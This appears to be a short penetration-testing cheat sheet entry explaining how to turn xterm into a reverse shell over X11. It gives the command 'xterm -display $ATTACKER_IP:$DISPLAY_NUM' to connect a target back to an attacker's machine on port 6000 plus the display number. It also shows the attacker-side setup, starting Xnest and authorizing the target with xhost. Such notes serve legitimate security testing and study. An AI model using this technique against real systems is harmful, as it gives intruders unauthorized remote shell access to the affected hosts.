# Exploiting Xterm

Remember that the X11 protocol is network based! You can thus get xterm to act as a reverse shell by simply providing it with a display pointing to your machine.

```bash
xterm -display $ATTACKER_IP:$DISPLAY_NUM
```

The connection will be made back on port 6000 + `$DISPLAY_NUM` (so, 6000 for display 0, 6001 for display 1, etc.).

This, of course, requires a running X server on your end (for example, `Xnest :1`). You'll need to make sure that connections from the target system are authrized.

```bash
xhost +$TARGET_IP
```
